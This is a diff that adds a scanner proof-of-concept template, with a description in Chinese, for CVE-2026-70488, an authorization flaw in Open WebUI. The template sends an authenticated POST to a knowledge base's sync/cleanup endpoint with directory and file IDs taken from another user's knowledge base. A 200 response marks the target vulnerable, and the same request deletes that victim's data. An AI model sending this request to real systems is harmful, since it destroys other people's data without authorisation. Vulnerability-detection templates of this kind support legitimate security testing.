@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "验证 Open WebUI 0.9.6-0.11.0 中 CVE-2026-70488 越权删除漏洞。以拥有知识库 A 写入权限的身份，向 /api/v1/knowledge/{kb_a_id}/sync/cleanup 发送包含知识库 B 的目录或文件 ID 的请求体，若服务器未拒绝则表明存在 IDOR 漏洞，可越权删除其他知识库的目录结构和文件向量嵌入。"
+id = "POC-AVE-2026-1383"
+name = "Open WebUI Knowledge Base 越权删除漏洞 PoC"
+severity = "medium"
+tags = ["ave-2026-1383"]
+vuln_id = [
+    "CVE-2026-70488",
+    "AVE-2026-1383",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/v1/knowledge/{{kb_a_id}}/sync/cleanup"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"dir_ids": ["{{victim_dir_id}}"], "file_ids": ["{{victim_file_id}}"]}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{auth_token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
